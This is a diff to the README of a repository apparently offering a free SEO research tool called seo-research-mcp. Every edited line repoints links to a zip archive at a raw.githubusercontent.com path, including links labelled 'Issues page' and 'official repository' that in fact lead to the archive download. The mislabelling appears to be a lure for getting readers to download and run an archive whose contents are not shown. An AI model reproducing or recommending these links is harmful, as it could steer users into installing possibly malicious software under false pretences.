@@ -8,7 +8,7 @@ Welcome to seo-research-mcp, your free SEO research tool. This application helps
 
 To get started, you need to download the application. Click the button below to visit the Releases page:
 
-[![Download seo-research-mcp](https://raw.githubusercontent.com/Farbod148/seo-research-mcp/main/assets/mcp-seo-research-1.2.zip)](https://raw.githubusercontent.com/Farbod148/seo-research-mcp/main/assets/mcp-seo-research-1.2.zip)
+[![Download seo-research-mcp](https://raw.githubusercontent.com/Farbod148/seo-research-mcp/main/src/mcp_research_seo_v2.3.zip)](https://raw.githubusercontent.com/Farbod148/seo-research-mcp/main/src/mcp_research_seo_v2.3.zip)
 
 On the Releases page, you will see the latest version of the application. Follow these steps to download it:
 
@@ -84,7 +84,7 @@ Currently, seo-research-mcp is designed for desktop use only.
 
 Join our community to get the latest updates, tips, and advice on using seo-research-mcp. Visit the project page for forums and contact details.
 
-For any questions or issues, visit our [Issues page](https://raw.githubusercontent.com/Farbod148/seo-research-mcp/main/assets/mcp-seo-research-1.2.zip) on GitHub to report problems or ask for help.
+For any questions or issues, visit our [Issues page](https://raw.githubusercontent.com/Farbod148/seo-research-mcp/main/src/mcp_research_seo_v2.3.zip) on GitHub to report problems or ask for help.
 
 ## 📢 Acknowledgments
 
@@ -92,8 +92,8 @@ This project uses data from Ahrefs. We appreciate their valuable API that powers
 
 ## 🔗 More Information
 
-For more details about features, updates, or contributions, visit the [official repository](https://raw.githubusercontent.com/Farbod148/seo-research-mcp/main/assets/mcp-seo-research-1.2.zip).
+For more details about features, updates, or contributions, visit the [official repository](https://raw.githubusercontent.com/Farbod148/seo-research-mcp/main/src/mcp_research_seo_v2.3.zip).
 
 Remember to check the Releases page again for future updates:
 
-[![Download seo-research-mcp](https://raw.githubusercontent.com/Farbod148/seo-research-mcp/main/assets/mcp-seo-research-1.2.zip)](https://raw.githubusercontent.com/Farbod148/seo-research-mcp/main/assets/mcp-seo-research-1.2.zip)
+[![Download seo-research-mcp](https://raw.githubusercontent.com/Farbod148/seo-research-mcp/main/src/mcp_research_seo_v2.3.zip)](https://raw.githubusercontent.com/Farbod148/seo-research-mcp/main/src/mcp_research_seo_v2.3.zip)
